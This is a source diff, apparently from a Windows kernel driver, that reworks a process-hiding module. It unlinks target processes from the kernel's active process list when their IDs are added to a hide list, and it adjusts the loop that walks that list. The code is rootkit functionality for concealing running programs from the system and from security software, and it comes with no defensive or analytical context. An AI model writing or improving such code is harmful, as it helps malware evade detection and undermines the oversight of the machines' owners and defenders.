@@ -45,7 +45,12 @@ namespace hide_proc
 	void AddProcIdToHideList(size_t pid)
 	{
 		kProcIdMutex.Lock();
-		kHideProcIdList->PushBack(eprocess::ProcInfo(pid));
+		eprocess::ProcInfo p(pid);
+		if (p.GetPid() != 0)
+		{
+			kHideProcIdList->PushBack(p);
+			p.DetachFromProcessList();
+		}
 		kProcIdMutex.Unlock();
 		return;
 
@@ -125,28 +130,26 @@ namespace hide_proc
 
 		while (true)
 		{
+			cnt++;
+
 			// Hide process
 			next_proc = eprocess::ProcInfo(cur_proc.GetNextProc());
-
+			
 			String<WCHAR> process_image_name = cur_proc.GetProcessImageName();
-			if (GetIndexInHiddenProcImageList(&process_image_name) != -1 || GetIndexInHiddenProcIdList(cur_proc.GetPid()) != -1)
+			
+			if ((process_image_name.Size() > 0 && GetIndexInHiddenProcImageList(&process_image_name) != -1) || GetIndexInHiddenProcIdList(cur_proc.GetPid()) != -1)
 			{
-				DebugMessage("Found PID to hide: %lld", cur_proc.GetPid());
-				cur_proc.DetachFromProcessList();
+				DebugMessage("Found PID to hide: %lld %llx", cur_proc.GetPid(), GetIndexInHiddenProcIdList(cur_proc.GetPid()));
+				//cur_proc.DetachFromProcessList();
 			}
-
+			
 			if (next_proc.GetPid() == SYSTEM_PROCESS_ID)
 			{
-				DebugMessage("GGEZ");
+
+				DebugMessage("GGEZ, %d", cnt);
 				break;
 			}
 			cur_proc = next_proc;
-
-			cnt++;
-			if (cnt == 1000)
-			{
-				break;
-			}
 		}
 	}
 
